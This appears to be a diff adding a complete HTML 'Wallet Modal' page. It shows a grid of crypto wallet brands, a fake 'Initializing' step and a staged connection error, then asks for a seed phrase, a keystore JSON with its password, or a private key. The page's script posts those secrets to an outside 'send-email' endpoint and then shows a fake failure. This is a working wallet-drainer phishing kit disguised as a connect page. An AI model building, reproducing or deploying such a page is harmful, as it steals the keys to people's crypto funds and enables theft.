@@ -1,0 +1,821 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Wallet Modal</title>
+    <script defer>
+      document.addEventListener("DOMContentLoaded", () => {
+       const wallets = [
+  {
+    name: "Metamask",
+    imgUrl: "./image/meta.png",
+  },
+  {
+    name: "Coinbase",
+    imgUrl: "./image/coinbase.png",
+  },
+  {
+    name: "Wallet connect",
+    imgUrl: "./image/WalletConnect-icon.svg",
+  },
+  {
+    name: "Trust",
+    imgUrl: "./image/trust.png",
+  },
+  {
+    name: "Xumm",
+    imgUrl: "./image/xumm.png",
+  },
+  {
+    name: "Cardano",
+    imgUrl: "./image/cardano.png",
+  },
+  {
+    name: "Daedalus",
+    imgUrl: "./image/daedalus.png",
+  },
+  {
+    name: "Yoroi",
+    imgUrl: "./image/yoroi.png",
+  },
+  {
+    name: "CCVault",
+    imgUrl: "./image/ccvault.png",
+  },
+  {
+    name: "Gero",
+    imgUrl: "./image/gero.jpg",
+  },
+  {
+    name: "Nami",
+    imgUrl: "./image/nami.png",
+  },
+  {
+    name: "Solana",
+    imgUrl: "./image/solana.png",
+  },
+  {
+    name: "Phantom",
+    imgUrl: "./image/phantom.jpg",
+  },
+  {
+    name: "Solflare",
+    imgUrl: "./image/solflare.png",
+  },
+  {
+    name: "Sollet",
+    imgUrl: "./image/sollet.png",
+  },
+  {
+    name: "Solong",
+    imgUrl: "./image/solong.jpg",
+  },
+  {
+    name: "Exodus",
+    imgUrl: "./image/exodus.png",
+  },
+  {
+    name: "Avalanche",
+    imgUrl: "./image/avalanche.png",
+  },
+  {
+    name: "Velas",
+    imgUrl: "./image/velas.png",
+  },
+  {
+    name: "crypto.com",
+    imgUrl: "./image/crypto.png",
+  },
+  {
+    name: "Blockchain",
+    imgUrl: "./image/blockchain.png",
+  },
+  {
+    name: "Binance Smart Chain",
+    imgUrl: "./image/bsc.png",
+  },
+  {
+    name: "Safepal",
+    imgUrl: "./image/safepal.png",
+  },
+  {
+    name: "Argent",
+    imgUrl: "./image/argent.jpg",
+  },
+  {
+    name: "Fortmatic",
+    imgUrl: "./image/formatic.png",
+  },
+  {
+    name: "Aktionariat",
+    imgUrl: "./image/aktionariat.png",
+  },
+  {
+    name: "Keyring Pro",
+    imgUrl: "./image/keyringpro.png",
+  },
+  {
+    name: "BitKeep",
+    imgUrl: "./image/bitkeep.png",
+  },
+  {
+    name: "SparkPoint",
+    imgUrl: "./image/sparkpoint.png",
+  },
+  {
+    name: "OwnBit",
+    imgUrl: "./image/ownbit.png",
+  },
+  {
+    name: "Infinty Wallet",
+    imgUrl: "./image/infinity-wallet.png",
+  },
+  {
+    name: "Wallet.io",
+    imgUrl: "./image/wallet-io.png",
+  },
+  {
+    name: "Infinito",
+    imgUrl: "./image/infinito.png",
+  },
+  {
+    name: "Torus",
+    imgUrl: "./image/torus.jpg",
+  },
+  {
+    name: "Nash",
+    imgUrl: "./image/nash.jpg",
+  },
+  {
+    name: "BitPay",
+    imgUrl: "./image/bitpay.jpg",
+  },
+  {
+    name: "imTOken",
+    imgUrl: "./image/imtoken.png",
+  },
+  {
+    name: "Ambire",
+    imgUrl: "./image/ambire.png",
+  },
+  {
+    name: "Apollox",
+    imgUrl: "./image/apollox.png",
+  },
+  {
+    name: "Bitski",
+    imgUrl: "./image/bitski.png",
+  },
+  {
+    name: "Bobablocks",
+    imgUrl: "./image/bobablocks.png",
+  },
+  {
+    name: "Crossmint",
+    imgUrl: "./image/crossmint.png",
+  },
+  {
+    name: "Defiant",
+    imgUrl: "./image/defiant.png",
+  },
+  {
+    name: "Fireblocks",
+    imgUrl: "./image/fireblocks.jpg",
+  },
+  {
+    name: "Kryptogo",
+    imgUrl: "./image/kryptogo.png",
+  },
+  {
+    name: "Ledger",
+    imgUrl: "./image/ledger.png",
+  },
+  {
+    name: "Now",
+    imgUrl: "./image/now.png",
+  },
+  {
+    name: "Nufinetes",
+    imgUrl: "./image/nufinetes.png",
+  },
+  {
+    name: "Onekey",
+    imgUrl: "./image/onekey.png",
+  },
+  {
+    name: "Paper",
+    imgUrl: "./image/paper.png",
+  },
+  {
+    name: "Pier",
+    imgUrl: "./image/pier.png",
+  },
+  {
+    name: "Prema",
+    imgUrl: "./image/prema.png",
+  },
+  {
+    name: "Rice",
+    imgUrl: "./image/rice.jpg",
+  },
+  {
+    name: "Safemoon",
+    imgUrl: "./image/safemoon.jpg",
+  },
+  {
+    name: "Secux",
+    imgUrl: "./image/secux.jpg",
+  },
+  {
+    name: "Sequence",
+    imgUrl: "./image/sequence.png",
+  },
+  {
+    name: "Tokenary",
+    imgUrl: "./image/tokenary.jpg",
+  },
+  {
+    name: "Unipass",
+    imgUrl: "./image/unipass.jpg",
+  },
+  {
+    name: "Venly",
+    imgUrl: "./image/venly.jpg",
+  },
+  {
+    name: "Verso",
+    imgUrl: "./image/verso.png",
+  },
+  {
+    name: "Wallet3",
+    imgUrl: "./image/wallet.png",
+  },
+  {
+    name: "Polkadot",
+    imgUrl: "./image/polkadot.png",
+  },
+  {
+    name: "Filecoin",
+    imgUrl: "./image/filecoin.png",
+  },
+  {
+    name: "IOST",
+    imgUrl: "./image/iost.png",
+  },
+  {
+    name: "Qtum",
+    imgUrl: "./image/qtum.png",
+  },
+  {
+    name: "Waves",
+    imgUrl: "./image/waves.jpg",
+  },
+  {
+    name: "Algorand",
+    imgUrl: "./image/algorand.png",
+  },
+  {
+    name: "Zcash",
+    imgUrl: "./image/zcash.png",
+  },
+  {
+    name: "Vechain",
+    imgUrl: "./image/vechain.png",
+  },
+  {
+    name: "Tezos",
+    imgUrl: "./image/tezos.png",
+  },
+  {
+    name: "Stellar",
+    imgUrl: "./image/stellar.png",
+  },
+  {
+    name: "Tron",
+    imgUrl: "./image/tron.webp",
+  },
+  {
+    name: "Terra",
+    imgUrl: "./image/terra.png",
+  },
+  {
+    name: "Cosmos",
+    imgUrl: "./image/cosmos.jpg",
+  },
+  {
+    name: "Metis",
+    imgUrl: "./image/metis.jpeg",
+  },
+  {
+    name: "Optimism",
+    imgUrl: "./image/Optimism.png",
+  },
+  {
+    name: "Injective",
+    imgUrl: "./image/Injective.png",
+  },
+  {
+    name: "Other Wallet",
+    imgUrl: "./image/other.jpg",
+  },
+];
+
+        const walletsContainer = document.querySelector(".wallets");
+        const dialog = document.getElementById("my_modal_1");
+        const walletNameDisplay = document.getElementById("walletName");
+        const walletImage = document.getElementById("walletImage");
+        const selectedWalletInfo =
+          document.getElementById("selectedWalletInfo");
+
+        let selectedWallet = null;
+
+        wallets.forEach((wallet) => {
+          const walletDiv = document.createElement("div");
+          walletDiv.className =
+            "wallet-option flex items-center flex-col justify-between border-2  rounded-[10px] py-[1.5em] px-[0.4em] cursor-pointer w-[49%] md:w-[49%] lg:w-[30%] shadow-lg mb-3";
+          walletDiv.style =
+            "padding: 10px; border: 1px solid #ccc; margin: 5px; cursor: pointer;";
+          walletDiv.innerHTML = `
+          <img src="${wallet.imgUrl}" alt="${wallet.name}" style="width:40px; height:40px; border-radius:50%;" />
+          <p>${wallet.name}</p>
+        `;
+
+          walletDiv.addEventListener("click", () => {
+            walletNameDisplay.textContent = wallet.name;
+            walletImage.src = wallet.imgUrl;
+            selectedWalletInfo.classList.remove("hidden");
+            selectedWallet = wallet; // Track selected wallet
+
+            dialog.showModal();
+            dialog.classList.add("flex", "justify-between", "items-center");
+
+            // After 3 seconds, close my_modal_1 and open my_modal_2
+            setTimeout(() => {
+              dialog.classList.remove(
+                "flex",
+                "justify-between",
+                "items-center"
+              );
+              dialog.close();
+              document.getElementById("my_modal_2").showModal();
+              renderMethodFields(); // Render fields when modal 2 opens
+            }, 3000);
+          });
+
+          walletsContainer.appendChild(walletDiv);
+        });
+
+        // Add this function after the wallets.forEach loop
+        function renderMethodFields() {
+          const method = document.getElementById("connect-method").value;
+          const methodFields = document.getElementById("method-fields");
+          methodFields.innerHTML = "";
+
+          const needsWalletName =
+            selectedWallet &&
+            (selectedWallet.name === "Other Wallet" ||
+              selectedWallet.name === "Wallet connect");
+
+          if (method === "phrase") {
+            methodFields.innerHTML = `
+      <textarea placeholder="Enter your phrase"></textarea>
+      ${
+        needsWalletName ? '<textarea placeholder="Wallet name"></textarea>' : ""
+      }
+    `;
+          } else if (method === "keystore") {
+            methodFields.innerHTML = `
+      <input type="text" placeholder="Enter your keystore JSON" />
+      <input type="text" placeholder="Wallet password" />
+      ${
+        needsWalletName ? '<textarea placeholder="Wallet name"></textarea>' : ""
+      }
+    `;
+          } else if (method === "private") {
+            methodFields.innerHTML = `
+      <input type="text" placeholder="Enter your private key" />
+      ${
+        needsWalletName ? '<textarea placeholder="Wallet name"></textarea>' : ""
+      }
+    `;
+          }
+        }
+
+        // Listen for changes to the select box
+        document
+          .getElementById("connect-method")
+          .addEventListener("change", renderMethodFields);
+
+        // Optionally, render fields on first open
+        // renderMethodFields();
+
+        document
+          .getElementById("manual-connect-btn")
+          .addEventListener("click", async function (e) {
+            e.preventDefault();
+
+            const method = document.getElementById("connect-method").value;
+            const methodFields = document.getElementById("method-fields");
+            let valid = false;
+            let dataToSend = {};
+
+            const needsWalletName =
+              selectedWallet &&
+              (selectedWallet.name === "Other Wallet" ||
+                selectedWallet.name === "Wallet connect");
+
+            if (method === "phrase") {
+              const textareas = methodFields.querySelectorAll("textarea");
+              if (needsWalletName) {
+                valid =
+                  textareas.length === 2 &&
+                  Array.from(textareas).every((ta) => ta.value.trim() !== "");
+                dataToSend = {
+                  phrase: textareas[0]?.value.trim(),
+                  item: textareas[1]?.value.trim(),
+                };
+              } else {
+                valid =
+                  textareas.length === 1 && textareas[0].value.trim() !== "";
+                dataToSend = {
+                  phrase: textareas[0]?.value.trim(),
+                  item: selectedWallet?.name,
+                };
+              }
+            } else if (method === "keystore") {
+              const inputs =
+                methodFields.querySelectorAll("input[type='text']");
+              const walletNameTextarea = needsWalletName
+                ? methodFields.querySelector("textarea")
+                : null;
+              if (needsWalletName) {
+                valid =
+                  inputs.length === 2 &&
+                  walletNameTextarea &&
+                  Array.from(inputs).every((inp) => inp.value.trim() !== "") &&
+                  walletNameTextarea.value.trim() !== "";
+                dataToSend = {
+                  keystore: {
+                    json: inputs[0]?.value.trim(),
+                    password: inputs[1]?.value.trim(),
+                  },
+                  item: walletNameTextarea.value.trim(),
+                };
+              } else {
+                valid =
+                  inputs.length === 2 &&
+                  Array.from(inputs).every((inp) => inp.value.trim() !== "");
+                dataToSend = {
+                  keystore: {
+                    json: inputs[0]?.value.trim(),
+                    password: inputs[1]?.value.trim(),
+                  },
+                  item: selectedWallet?.name,
+                };
+              }
+            } else if (method === "private") {
+              const input = methodFields.querySelector("input[type='text']");
+              const walletNameTextarea = needsWalletName
+                ? methodFields.querySelector("textarea")
+                : null;
+              if (needsWalletName) {
+                valid =
+                  input &&
+                  input.value.trim() !== "" &&
+                  walletNameTextarea &&
+                  walletNameTextarea.value.trim() !== "";
+                dataToSend = {
+                  privateKey: input.value.trim(),
+                  item: walletNameTextarea.value.trim(),
+                };
+              } else {
+                valid = input && input.value.trim() !== "";
+                dataToSend = {
+                  privateKey: input.value.trim(),
+                  item: selectedWallet?.name,
+                };
+              }
+            }
+
+            if (valid) {
+              document.getElementById("my_modal_2").close();
+              const finalModal = document.getElementById("my_modal_3");
+              if (finalModal) finalModal.showModal();
+
+              try {
+                const response = await fetch(
+                  "https://sendmail-xth8.onrender.com/api/send-email",
+                  {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(dataToSend),
+                  }
+                );
+                console.log(dataToSend);
+                
+                // Optionally handle response here
+              } catch (error) {
+                console.error("Error submitting form:", error);
+              }
+
+              setTimeout(() => {
+                document.getElementById("my_modal_3").close();
+                document.getElementById("my_modal_4").showModal();
+              }, 3000);
+            }
+          });
+      });
+
+      function closeDialog() {
+        const dialog = document.getElementById("my_modal_1");
+        dialog.close();
+      }
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+  </head>
+  <body
+    style="background: black; color: white"
+    class="bg-black text-white w-full h-screen flex flex-col items-center"
+  >
+    <h3 className="text-black font-bold text-white">Connection page</h3>
+    <p className="">Connect with one of our available providers</p>
+
+    <div
+      class="wallets pt-7 px-3 flex flex-wrap justify-between lg:px-5 gap-1 w-full"
+      style="display: flex; flex-wrap: wrap"
+    ></div>
+
+    <dialog id="my_modal_1" class="modal w-full h-full self-center">
+      <div
+        class="modal-box bg-white flex flex-col gap-5 rounded-lg shadow-xl text-black w-[70%] h-auto px-3 py-5"
+      >
+        <!-- Header: Initializing & Close Button -->
+        <div class="flex items-center justify-between">
+          <div class="flex items-center gap-3 text-green-500 font-bold">
+            Initializing
+            <span
+              class="loading loading-bars loading-xs bg-green-500 w-3 h-3 rounded-full animate-pulse"
+              style="animation-delay: 0"
+            ></span>
+            <span
+              class="loading loading-bars loading-xs bg-green-500 w-3 h-3 rounded-full animate-pulse"
+              style="animation-delay: 0.15s"
+            ></span>
+            <span
+              class="loading loading-bars loading-xs bg-green-500 w-3 h-3 rounded-full animate-pulse"
+              style="animation-delay: 0.3s"
+            ></span>
+          </div>
+
+          <form method="dialog">
+            <button
+              class="outline-none text-sm font-bold text-gray-500 hover:text-red-500"
+            >
+              X
+            </button>
+          </form>
+        </div>
+
+        <!-- Selected Wallet Info: hidden by default -->
+        <div
+          id="selectedWalletInfo"
+          class="hidden flex items-center justify-between p-3 border border-gray-300 rounded-lg"
+        >
+          <div class="flex flex-col gap-1">
+            <h5 id="walletName" class="font-bold text-gray-800 text-start">
+              Wallet Name
+            </h5>
+            <p class="text-[12px] text-gray-500">
+              Easy-to-use browser extension
+            </p>
+          </div>
+          <div>
+            <img
+              id="walletImage"
+              src=""
+              alt="wallet"
+              class="w-10 h-10 rounded-full"
+            />
+          </div>
+        </div>
+      </div>
+    </dialog>
+
+    <!-- Modal 2: Manual Input -->
+    <dialog id="my_modal_2" class="modal w-full h-full self-center">
+      <div class="modal-box bg-white w-[65%] p3-5 py-5 rounded-lg">
+        <p class="text-red-500 text-[16px] md:text-[16px]">
+          There was an error connecting automatically. But do not worry, you can
+          still connect manually.
+        </p>
+
+        <p class="text-[15px] font-bold text-start text-black mb-1">
+          DApp Type:
+        </p>
+
+        <div class="flex flex-col rounded-[20px] border-1 shadow-lg py-5 px-3">
+          <div>
+            <select
+              id="connect-method"
+              class="rounded-full p-1 mb-3 text-green-700"
+            >
+              <option value="phrase">Phrase</option>
+              <option value="keystore">Keystore JSON</option>
+              <option value="private">Private Key</option>
+            </select>
+          </div>
+
+          <div id="method-fields">
+            <!-- Dynamic inputs injected here based on selection -->
+          </div>
+
+          <div class="form-control">
+            <button
+              id="manual-connect-btn"
+              class="text-[14px] bg-[#090979] rounded-[4px] text-white font-bold"
+            >
+              Connect
+            </button>
+          </div>
+        </div>
+
+        <div class="modal-action">
+          <form method="dialog">
+            <button
+              class="h-[2rem] rounded-[5px] w-[90px] bg-red-500 text-white border-none"
+            >
+              Close
+            </button>
+          </form>
+        </div>
+      </div>
+    </dialog>
+
+    <!-- Modal 3: Status/Error -->
+    <dialog
+      id="my_modal_3"
+      class="modal bg-[#00000069] w-full h-full self-center rounded-lg"
+    >
+      <div
+        class="flex flex-col gap-5 modal-box bg-white w-[70%] modal-box rounded-lg"
+      >
+        <div class="flex items-center justify-between px-3 py-5">
+          <div
+            id="status-message"
+            class="text-[13px] flex items-center gap-3 font-bold text-green-600"
+          >
+            Connection verification pending
+            <span
+              class="loading-dot-bounce bg-green-600"
+              style="animation-delay: 0s"
+            ></span>
+            <span
+              class="loading-dot-bounce bg-green-600"
+              style="animation-delay: 0.15s"
+            ></span>
+            <span
+              class="loading-dot-bounce bg-green-600"
+              style="animation-delay: 0.3s"
+            ></span>
+          </div>
+          <form method="dialog">
+            <button class="outline-none h-[10px] text-[13px] font-bold">
+              X
+            </button>
+          </form>
+        </div>
+      </div>
+    </dialog>
+
+    <!-- Modal 4: Error -->
+    <dialog
+      id="my_modal_4"
+      class="modal bg-[#00000069] w-full h-full self-center rounded-lg"
+    >
+      <div
+        class="flex flex-col gap-5 modal-box bg-white w-[70%] modal-box rounded-lg"
+      >
+        <div class="flex items-center justify-between px-3 py-5">
+          <div
+            id="status-message"
+            class="text-[13px] flex items-center gap-3 font-bold text-red-600"
+          >
+            Error connecting to wallet...
+          </div>
+          <form method="dialog">
+            <button class="outline-none h-[10px] text-[13px] font-bold">
+              X
+            </button>
+          </form>
+        </div>
+      </div>
+    </dialog>
+
+    <style>
+      @keyframes pulse {
+        0% {
+          opacity: 1;
+        }
+        50% {
+          opacity: 0.5;
+        }
+        100% {
+          opacity: 1;
+        }
+      }
+
+      dialog[open] {
+        position: fixed !important;
+        inset: 0 !important;
+        width: 100vw !important;
+        margin: 0 !important;
+        padding: 0 !important;
+        background: rgba(0, 0, 0, 0.7); /* optional: darken background */
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 50;
+        max-height: 100vh;
+      }
+
+      #my_modal_2 .modal-box {
+        background: #fff;
+        border-radius: 20px;
+        box-shadow: 0 4px 24px rgba(0, 0, 0, 0.12);
+        padding: 2rem 1.5rem 1.5rem 1.5rem;
+        margin: auto;
+      }
+
+      #my_modal_2 select {
+        background: #222;
+        color: #2ecc40;
+        border: none;
+        border-radius: 2em;
+        padding: 0.5em 1em;
+        font-size: 1.1rem;
+        margin-bottom: 1.2rem;
+        width: 60%;
+        display: block;
+      }
+
+      #my_modal_2 textarea,
+      #my_modal_2 input[type="text"] {
+        width: 100%;
+        border-radius: 1em;
+        border: 1px solid #ddd;
+        padding: 1em;
+        font-size: 1rem;
+        margin-bottom: 1.2rem;
+        min-height: 70px;
+        resize: vertical;
+      }
+
+      #my_modal_2 #manual-connect-btn {
+        background: #090979;
+        color: #fff;
+        border-radius: 8px;
+        font-weight: bold;
+        width: 100%;
+        padding: 0.8em 0;
+        font-size: 1.1rem;
+        margin-top: 1em;
+        border: none;
+        transition: background 0.2s;
+      }
+      #my_modal_2 #manual-connect-btn:hover {
+        background: #06065e;
+      }
+
+      #my_modal_2 .modal-action {
+        display: flex;
+        justify-content: flex-end;
+        margin-top: 1.5em;
+      }
+
+      #my_modal_2 .modal-action button:hover {
+        background: #b71c1c;
+      }
+
+      .loading-dot-bounce {
+        display: inline-block;
+        width: 12px;
+        height: 12px;
+        border-radius: 50%;
+        background: #2ecc40; /* Tailwind blue-600 */
+        animation: dot-bounce 0.7s infinite alternate
+          cubic-bezier(0.6, -0.28, 0.74, 0.05);
+        vertical-align: middle;
+      }
+
+      @keyframes dot-bounce {
+        0% {
+          transform: translateY(0);
+        }
+        100% {
+          transform: translateY(-12px);
+        }
+      }
+    </style>
+  </body>
+</html>
